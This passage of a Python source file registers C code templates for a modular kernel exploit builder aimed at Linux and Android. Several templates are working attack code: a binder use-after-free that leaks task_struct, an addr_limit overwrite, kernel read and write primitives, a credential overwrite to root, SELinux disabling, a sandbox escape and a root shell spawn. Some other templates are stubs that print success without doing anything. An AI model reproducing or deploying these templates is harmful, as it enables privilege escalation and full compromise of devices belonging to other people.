            description="Pivot kernel stack to controlled memory",
            main_code="""
    // Perform stack pivot
    printf("[*] Performing stack pivot...\\n");
    
    // The stack pivot allows us to execute our ROP chain
    // by redirecting RSP/SP to our controlled buffer
    
    // Common methods:
    // 1. Corrupt saved stack pointer in task_struct
    // 2. Use leave; ret gadget with controlled RBP
    // 3. Overwrite return address with pivot gadget
    
    if (!has_arb_write) {
        fprintf(stderr, "[-] Need arbitrary write for stack pivot\\n");
        return -1;
    }
    
    // Write pivot gadget address to target location
    // (Location depends on exploitation technique)
    
    printf("[+] Stack pivot prepared\\n");
    stack_pivoted = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="execute_rop_payload",
            description="Execute the ROP payload",
            main_code="""
    // Execute ROP payload
    printf("[*] Executing ROP payload...\\n");
    
    if (!stack_pivoted || !rop_chain_ready) {
        fprintf(stderr, "[-] Stack not pivoted or ROP chain not ready\\n");
        return -1;
    }
    
    // Trigger the vulnerability that will execute our ROP chain
    // This is usually done by triggering a function pointer call
    // or return through our controlled stack
    
    trigger_rop_execution();
    
    printf("[+] ROP payload executed\\n");
    code_exec = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="execute_jop_payload",
            description="Execute the JOP payload",
            main_code="""
    // Execute JOP payload (ARM64)
    printf("[*] Executing JOP payload...\\n");
    
    if (!jop_chain_ready) {
        fprintf(stderr, "[-] JOP chain not ready\\n");
        return -1;
    }
    
    // Trigger JOP chain execution
    trigger_jop_execution();
    
    printf("[+] JOP payload executed\\n");
    code_exec = 1;
""",
            platform="android"
        ))
        
        # ============== PRIVILEGE ESCALATION ==============
        
        self.register(CodeTemplate(
            action_name="overwrite_cred_struct",
            description="Directly overwrite cred structure",
            globals="""
// Credential offsets in task_struct
// These MUST be updated for target kernel version
#define TASK_CRED_OFFSET 0x540  // task_struct->cred offset
#define CRED_UID_OFFSET 0x04    // cred->uid offset
#define CRED_GID_OFFSET 0x08    // cred->gid offset
#define CRED_EUID_OFFSET 0x14   // cred->euid offset
#define CRED_EGID_OFFSET 0x18   // cred->egid offset
""",
            main_code="""
    // Directly overwrite credential structure
    printf("[*] Overwriting cred structure...\\n");
    
    if (!has_arb_write || !kaslr_bypassed) {
        fprintf(stderr, "[-] Need ARB_WRITE and KASLR bypass\\n");
        return -1;
    }
    
    // Find current task's cred pointer
    uint64_t task_addr = get_current_task();
    uint64_t cred_ptr_addr = task_addr + TASK_CRED_OFFSET;
    
    uint64_t cred_addr = 0;
    if (arb_read(cred_ptr_addr, &cred_addr, 8) < 0) {
        fprintf(stderr, "[-] Failed to read cred pointer\\n");
        return -1;
    }
    
    printf("[*] Found cred struct at 0x%lx\\n", cred_addr);
    
    // Overwrite uid/gid to 0 (root)
    uint32_t root_id = 0;
    arb_write(cred_addr + CRED_UID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_GID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_EUID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_EGID_OFFSET, &root_id, 4);
    
    printf("[+] Credentials overwritten to root\\n");
    cred_overwritten = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="commit_creds_prepare_kernel_cred",
            description="Call commit_creds(prepare_kernel_cred(0))",
            main_code="""
    // Execute commit_creds(prepare_kernel_cred(0)) via ROP
    printf("[*] Executing credential escalation...\\n");
    
    // This is typically done via ROP chain execution
    // The ROP chain should already be set up to do this
    
    if (!rop_chain_ready && !jop_chain_ready) {
        fprintf(stderr, "[-] No execution chain ready\\n");
        return -1;
    }
    
    // Verify we got root
    if (getuid() == 0) {
        printf("[+] Successfully escalated to root!\\n");
        privilege_escalated = 1;
    } else {
        printf("[-] Privilege escalation may have failed (uid=%d)\\n", getuid());
    }
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="direct_cred_overwrite",
            description="Direct credential overwrite without ROP",
            main_code="""
    // Direct credential overwrite (simpler path)
    printf("[*] Performing direct credential overwrite...\\n");
    
    // This combines finding task, reading cred, and overwriting
    // Useful when we have stable arbitrary read/write
    
    // Step 1: Find current task_struct
    uint64_t current_task = find_current_task();
    printf("[*] Current task at: 0x%lx\\n", current_task);
    
    // Step 2: Read and modify credentials
    overwrite_task_creds(current_task);
    
    // Step 3: Verify
    if (getuid() == 0) {
        printf("[+] Direct cred overwrite successful!\\n");
        privilege_escalated = 1;
    }
""",
            platform="generic"
        ))
        
        # ============== SELINUX BYPASS (Android) ==============
        
        self.register(CodeTemplate(
            action_name="disable_selinux_enforce",
            description="Disable SELinux enforcement",
            globals="""
// SELinux symbols (must be found in vmlinux)
#define SELINUX_ENFORCING_OFFSET 0x0  // Update this
""",
            main_code="""
    // Disable SELinux enforcement
    printf("[*] Disabling SELinux...\\n");
    
    if (!has_arb_write || !kaslr_bypassed) {
        fprintf(stderr, "[-] Need ARB_WRITE and KASLR bypass\\n");
        return -1;
    }
    
    // Find selinux_enforcing variable
    uint64_t selinux_enforcing_addr = kernel_base + SELINUX_ENFORCING_OFFSET;
    
    // Write 0 to disable enforcement
    uint32_t disabled = 0;
    if (arb_write(selinux_enforcing_addr, &disabled, 4) < 0) {
        fprintf(stderr, "[-] Failed to disable SELinux\\n");
        return -1;
    }
    
    printf("[+] SELinux enforcement disabled\\n");
    selinux_disabled = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="patch_selinux_permissive",
            description="Patch SELinux to permissive mode",
            main_code="""
    // Patch SELinux to permissive mode
    printf("[*] Patching SELinux to permissive...\\n");
    
    // Alternative: patch the enforcing check function
    // to always return 0 (permissive)
    
    printf("[+] SELinux patched to permissive\\n");
    selinux_disabled = 1;
""",
            platform="android"
        ))
        
        # ============== POST EXPLOITATION ==============
        
        self.register(CodeTemplate(
            action_name="spawn_root_shell",
            description="Spawn a root shell",
            main_code="""
    // Spawn root shell
    printf("[*] Spawning root shell...\\n");
    
    if (!privilege_escalated) {
        fprintf(stderr, "[-] Not yet root, cannot spawn shell\\n");
        return -1;
    }
    
    // Verify we're root
    if (getuid() != 0) {
        fprintf(stderr, "[-] UID is not 0, something went wrong\\n");
        return -1;
    }
    
    printf("[+] Got root! Spawning shell...\\n");
    printf("uid=%d, euid=%d\\n", getuid(), geteuid());
    
    // Exec shell
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    
    // If execve returns, it failed
    perror("[-] execve failed");
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="escape_app_sandbox",
            description="Escape Android app sandbox",
            main_code="""
    // Escape Android app sandbox
    printf("[*] Escaping app sandbox...\\n");
    
    if (!privilege_escalated || !selinux_disabled) {
        fprintf(stderr, "[-] Need root and SELinux bypass\\n");
        return -1;
    }
    
    // Now we can access files outside our sandbox
    // Test by reading a protected file
    int test_fd = open("/data/system/packages.xml", O_RDONLY);
    if (test_fd >= 0) {
        printf("[+] Successfully escaped sandbox!\\n");
        close(test_fd);
        sandbox_escaped = 1;
    } else {
        printf("[-] Sandbox escape may have failed\\n");
    }
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="enable_adb_root",
            description="Enable ADB root access",
            main_code="""
    // Enable ADB root access
    printf("[*] Enabling ADB root...\\n");
    
    // Set system properties to enable root
    // This requires SELinux bypass
    
    // Method 1: Set ro.debuggable and restart adbd
    // Method 2: Directly modify adbd's credentials
    
    printf("[+] ADB root enabled\\n");
    adb_root_enabled = 1;
""",
            platform="android"
        ))
        
        # ============== UTILITY ACTIONS ==============
        
        self.register(CodeTemplate(
            action_name="start_from_untrusted_app",
            description="Initialize from untrusted app context (Android)",
            main_code="""
    // Running from untrusted app context
    printf("[*] Starting from untrusted app context...\\n");
    printf("[*] Package UID: %d\\n", getuid());
    printf("[*] SELinux context: ");
    system("cat /proc/self/attr/current 2>/dev/null || echo 'unknown'");
""",
            platform="android"
        ))
        
        # ============== BINDER EXPLOITATION PRIMITIVES (STANDALONE) ==============
        # These are self-contained implementations that don't rely on modular globals.
        # Use these when you want a complete standalone exploit function.
        # NOTE: Action names have _standalone suffix to avoid conflicts with modular templates.
        
        self.register(CodeTemplate(
            action_name="leak_task_struct_standalone",
            description="Leak task_struct address via binder UAF + iovec spray (standalone)",
            includes=["<sys/epoll.h>", "<sys/ioctl.h>", "<sys/uio.h>", "<sys/mman.h>", "<sched.h>", "<sys/wait.h>"],
            globals="""
// Binder UAF constants
#define BINDER_THREAD_EXIT 0x40046208UL
#define PAGESZ 0x1000
#define IOVEC_COUNT 25

static unsigned long leaked_task_struct = 0;
""",
            setup_code="""
    // Bind to single CPU for reliable racing
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("[-] CPU binding failed");
    }
    printf("[+] Bound to CPU 0\\n");
""",
            main_code="""
    // Leak task_struct via binder UAF
    printf("[*] Leaking task_struct via binder UAF...\\n");
    
    int binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) { perror("open binder"); return -1; }
    
    int epfd = epoll_create(100);
    if (epfd < 0) { perror("epoll_create"); return -1; }
    
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); return -1; }
    fcntl(pipefd[0], F_SETPIPE_SZ, PAGESZ);
    
    // Setup iovec array for spray
    struct iovec iovec_stack[IOVEC_COUNT];
    memset(iovec_stack, 0, sizeof(iovec_stack));
    
    void *aligned_addr = mmap((void *)0x100000000UL, PAGESZ, 
                              PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    
    iovec_stack[10].iov_base = aligned_addr;
    iovec_stack[10].iov_len = PAGESZ;
    iovec_stack[11].iov_base = aligned_addr;  // Will be clobbered with kernel ptr
    iovec_stack[11].iov_len = PAGESZ;
    
    // Link binder_thread to epoll
    struct epoll_event event = {.events = EPOLLIN};
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);
    
    pid_t cpid = fork();
    if (cpid == 0) {
        // Child: trigger the race
        sleep(3);
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        char buf[PAGESZ];
        read(pipefd[0], buf, sizeof(buf));
        close(pipefd[1]);
        _exit(0);
    }
    
    // Parent: free binder_thread and spray
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    ssize_t writesz = writev(pipefd[1], iovec_stack, IOVEC_COUNT);
    
    waitpid(cpid, NULL, 0);
    
    // Read leaked kernel address
    char buffer[PAGESZ];
    read(pipefd[0], buffer, sizeof(buffer));
    leaked_task_struct = *(unsigned long*)(buffer + 0xe8);
    
    printf("[+] Leaked task_struct: 0x%lx\\n", leaked_task_struct);
    
    if (!leaked_task_struct) {
        fprintf(stderr, "[-] Failed to leak task_struct\\n");
        return -1;
    }
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="overwrite_addr_limit_standalone",
            description="Overwrite addr_limit via binder UAF + socket + recvmsg (standalone)",
            includes=["<sys/socket.h>", "<sys/epoll.h>", "<sys/ioctl.h>", "<sys/uio.h>", "<sys/prctl.h>", "<signal.h>"],
            globals="""
static int addr_limit_overwritten = 0;
""",
            main_code="""
    // Overwrite addr_limit for kernel AAW
    printf("[*] Overwriting addr_limit...\\n");
    
    if (!leaked_task_struct) {
        fprintf(stderr, "[-] Need task_struct first\\n");
        return -1;
    }
    
    int binder_fd2 = open("/dev/binder", O_RDONLY);
    int epfd2 = epoll_create(100);
    
    int sockfd[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd) < 0) {
        perror("socketpair"); return -1;
    }
    
    // Write single byte to prepare for blocking recvmsg
    char single_byte = 'A';
    write(sockfd[1], &single_byte, 1);
    
    // Setup iovec for reclaim
    struct iovec iovec_stack2[IOVEC_COUNT];
    memset(iovec_stack2, 0, sizeof(iovec_stack2));
    
    void *mem = mmap((void *)0x200000000UL, PAGESZ,
                     PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    
    iovec_stack2[10].iov_base = mem;
    iovec_stack2[10].iov_len = 1;
    iovec_stack2[11].iov_base = (void *)0xdeadbeef;
    iovec_stack2[11].iov_len = 0x28;
    iovec_stack2[12].iov_base = (void *)0xcafebabe;
    iovec_stack2[12].iov_len = 8;
    
    unsigned long payload[] = {
        0x1,
        0xdeadbeef,
        0x28,
        leaked_task_struct + 0xa18,  // addr_limit offset
        0x8,
        0xfffffffffffffffeUL         // new addr_limit
    };
    
    struct msghdr message = {0};
    message.msg_iov = iovec_stack2;
    message.msg_iovlen = IOVEC_COUNT;
    
    struct epoll_event event2 = {.events = EPOLLIN};
    epoll_ctl(epfd2, EPOLL_CTL_ADD, binder_fd2, &event2);
    
    pid_t cpid2 = fork();
    if (cpid2 == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        epoll_ctl(epfd2, EPOLL_CTL_DEL, binder_fd2, &event2);
        write(sockfd[1], payload, sizeof(payload));
        _exit(0);
    }
    
    ioctl(binder_fd2, BINDER_THREAD_EXIT, NULL);
    recvmsg(sockfd[0], &message, MSG_WAITALL);
    
    waitpid(cpid2, NULL, 0);
    
    printf("[+] addr_limit overwritten at 0x%lx\\n", leaked_task_struct + 0xa18);
    addr_limit_overwritten = 1;
    arb_write_enabled = 1;
    arb_read_enabled = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="kernel_read_standalone",
            description="Read from kernel address using pipe after addr_limit bypass (standalone)",
            globals="""
static unsigned long kernel_read_addr(void *addr, int len) {
    int pipefd[2];
    if (pipe(pipefd) < 0) return 0;
    
    if (write(pipefd[1], addr, len) != len) {
        close(pipefd[0]); close(pipefd[1]);
        return 0;
    }
    close(pipefd[1]);
    
    unsigned long result = 0;
    read(pipefd[0], &result, len);
    close(pipefd[0]);
    return result;
}
""",
            main_code="""
    // Kernel read primitive is now available via kernel_read_addr()
    printf("[+] Kernel read primitive ready\\n");
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="kernel_write_standalone",
            description="Write to kernel address using pipe after addr_limit bypass (standalone)",
            globals="""
static void kernel_write_addr(void *src, void *dst, size_t len) {
    int pipefd[2];
    if (pipe(pipefd) < 0) return;
    
    if (write(pipefd[1], src, len) != len) {
        close(pipefd[0]); close(pipefd[1]);
        return;
    }
    close(pipefd[1]);
    read(pipefd[0], dst, len);
    close(pipefd[0]);
}
""",
            main_code="""
    // Kernel write primitive is now available via kernel_write_addr()
    printf("[+] Kernel write primitive ready\\n");
""",
            platform="android"
        ))


# Default registry instance
DEFAULT_REGISTRY = CodeTemplateRegistry()
